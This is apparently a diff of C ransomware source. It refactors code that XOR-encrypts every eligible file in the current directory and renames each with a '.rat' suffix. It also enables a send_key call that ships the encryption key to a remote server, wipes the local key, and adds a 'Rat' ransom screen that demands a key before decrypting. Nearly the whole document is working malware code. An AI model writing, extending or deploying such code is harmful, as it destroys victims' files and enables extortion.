@@ -18,6 +18,8 @@
 #define MAGIC_LEN 1000
 #define MAGIC_KEY 2
 
+#define DBG
+
 void encrypt_mem(char *buffer, size_t size, unsigned long key) {
     for (size_t i = 0; i < size; i++) {
         buffer[i] ^= (key >> ((i % 8) * 8)) & 0xFF;
@@ -67,7 +69,10 @@ int send_key(unsigned long key){
 
     // Send the byte array to the server
     send(sock, buffer, sizeof(unsigned long), 0);
+
+#ifdef DBG
     printf("Sent unsigned long value: %lu\n", key);
+#endif
 
     close(sock);
 }
@@ -94,7 +99,6 @@ unsigned long authorized_key(unsigned long key){
 int validation_key(unsigned long key){
     char magic_1, magic_2;
     if(key % 2 != 0){
-        printf("1\n");
         return 0;
     }
 
@@ -105,7 +109,6 @@ int validation_key(unsigned long key){
     key = key >> 4;
 
     if(key % 2 != 1){
-        printf("2\n");
         return 0;
     }
     
@@ -114,7 +117,6 @@ int validation_key(unsigned long key){
     magic_2 &= 0x0F;
 
     if(magic_1 != magic_2)  {
-        printf("3\n");
         return 0;
     }
     return 1;
@@ -134,68 +136,154 @@ unsigned long generate_key(){
     return key;
 }
 
+void encrypt_dir(unsigned long key, char* dir_name){
+    DIR *d;
+    struct dirent *dir;
+    d = opendir(dir_name);
+    if (d) {
+        while ((dir = readdir(d)) != NULL) {
+            int fd;
+            
+            unsigned char buffer[1024];  // Buffer to store read data
+
+            // Open file in read and write binary mode
+            struct stat path_stat;
+            if (stat(dir->d_name, &path_stat) != 0) {
+                perror("stat");
+                return;
+            }
+
+            if (!S_ISDIR(path_stat.st_mode) && valid_file(dir->d_name)) {
+                fd = open(dir->d_name, O_RDWR);
+
+                // Map the file into memory
+                char *file_contents = mmap(NULL, path_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+                if (file_contents == MAP_FAILED) {
+                    perror("Error mapping file to memory");
+                    close(fd);
+                    return;
+                }
+
+                // XOR the file contents with the key
+                encrypt_mem(file_contents, path_stat.st_size, key);
+                
+
+                if (munmap(file_contents, path_stat.st_size) == -1) {
+                    perror("Error unmapping file from memory");
+                    close(fd);
+                    return;
+                }
+
+                // Close the file
+                close(fd);
+
+                const char* suffix = ".rat";
+                char new_name[256]; // Assuming maximum file name length is 255 characters
+
+                // Copy the old name to the new name buffer
+                strcpy(new_name, dir->d_name);
+
+                // Append the suffix to the new name
+                strcat(new_name, suffix);
+                // Unmap the file from memory
+                rename(dir->d_name, new_name);
+            }
+        } 
+    } 
+}
+
+void decrypt_dir(unsigned long key, char* dir_name){
+    DIR *d;
+    struct dirent *dir;
+    d = opendir(dir_name);
+    if (d) {
+        while ((dir = readdir(d)) != NULL) {
+            int fd;
+            
+            unsigned char buffer[1024];  // Buffer to store read data
+
+            // Open file in read and write binary mode
+            struct stat path_stat;
+            if (stat(dir->d_name, &path_stat) != 0) {
+                perror("stat");
+                return;
+            }
+
+            if (!S_ISDIR(path_stat.st_mode) && valid_file(dir->d_name)) {
+                fd = open(dir->d_name, O_RDWR);
+
+                // Map the file into memory
+                char *file_contents = mmap(NULL, path_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+                if (file_contents == MAP_FAILED) {
+                    perror("Error mapping file to memory");
+                    close(fd);
+                    return;
+                }
+
+                // XOR the file contents with the key
+                decrypt_mem(file_contents, path_stat.st_size, key);
+                
+
+                if (munmap(file_contents, path_stat.st_size) == -1) {
+                    perror("Error unmapping file from memory");
+                    close(fd);
+                    return;
+                }
+
+                // Close the file
+                close(fd);
+
+                char new_name[256]; // Assuming maximum file name length is 255 characters
+
+                // Copy the old name to the new name buffer
+                strcpy(new_name, dir->d_name);
+                new_name[strlen(dir->d_name) - 4] = '\0';
+
+                // Unmap the file from memory
+                rename(dir->d_name, new_name);
+            }
+        } 
+    } 
+}
+
+unsigned long ransom_dialog(){  
+    unsigned long key;                                                                                                                    
+    system("clear");
+    printf("RRRRRRRRRRRRRRRRR                             tttt          \n");
+    printf("R::::::::::::::::R                         ttt:::t          \n");
+    printf("R::::::RRRRRR:::::R                        t:::::t          \n");
+    printf("RR:::::R     R:::::R                       t:::::t          \n");
+    printf("  R::::R     R:::::R  aaaaaaaaaaaaa  ttttttt:::::ttttttt    \n");
+    printf("  R::::R     R:::::R  a::::::::::::a t:::::::::::::::::t    \n");
+    printf("  R::::RRRRRR:::::R   aaaaaaaaa:::::at:::::::::::::::::t    \n");
+    printf("  R:::::::::::::RR             a::::atttttt:::::::tttttt    \n");
+    printf("  R::::RRRRRR:::::R     aaaaaaa:::::a      t:::::t          \n");
+    printf("  R::::R     R:::::R  aa::::::::::::a      t:::::t          \n");
+    printf("  R::::R     R:::::R a::::aaaa::::::a      t:::::t          \n");
+    printf("  R::::R     R:::::Ra::::a    a:::::a      t:::::t    tttttt\n");
+    printf("RR:::::R     R:::::Ra::::a    a:::::a      t::::::tttt:::::t\n");
+    printf("R::::::R     R:::::Ra:::::aaaa::::::a      tt::::::::::::::t\n");
+    printf("R::::::R     R:::::R a::::::::::aa:::a       tt:::::::::::tt\n");
+    printf("RRRRRRRR     RRRRRRR  aaaaaaaaaa  aaaa         ttttttttttt  \n\n\n");
+    do {
+        printf("Key: ");
+        scanf("%lu", &key);
+        getchar();
+    } while (!validation_key(key));
+    
+
+    return key;
+}
 
 int main(void){
     {
         unsigned long key = generate_key();
-        //send_key(key);
-        DIR *d;
-        struct dirent *dir;
-        d = opendir(".");
-        if (d) {
-            while ((dir = readdir(d)) != NULL) {
-                int fd;
-                
-                unsigned char buffer[1024];  // Buffer to store read data
-
-                // Open file in read and write binary mode
-                struct stat path_stat;
-                if (stat(dir->d_name, &path_stat) != 0) {
-                    perror("stat");
-                    return 1;
-                }
-
-                if (!S_ISDIR(path_stat.st_mode) && valid_file(dir->d_name)) {
-                    fd = open(dir->d_name, O_RDWR);
-
-                    // Map the file into memory
-                    char *file_contents = mmap(NULL, path_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-                    if (file_contents == MAP_FAILED) {
-                        perror("Error mapping file to memory");
-                        close(fd);
-                        return 1;
-                    }
-
-                    // XOR the file contents with the key
-                    encrypt_mem(file_contents, path_stat.st_size, key);
-                    
-
-                    if (munmap(file_contents, path_stat.st_size) == -1) {
-                        perror("Error unmapping file from memory");
-                        close(fd);
-                        return 1;
-                    }
-
-                    // Close the file
-                    close(fd);
-
-                    const char* suffix = ".rat";
-                    char new_name[256]; // Assuming maximum file name length is 255 characters
-
-                    // Copy the old name to the new name buffer
-                    strcpy(new_name, dir->d_name);
-
-                    // Append the suffix to the new name
-                    strcat(new_name, suffix);
-                    // Unmap the file from memory
-                    rename(dir->d_name, new_name);
-                }
-            } 
-        }       
-        key ^= key;
-        
+        send_key(key);
+        encrypt_dir(key, ".");
+        key ^= key;        
     }    
 
+    decrypt_dir(ransom_dialog(), ".");
 
     return 0;
 }
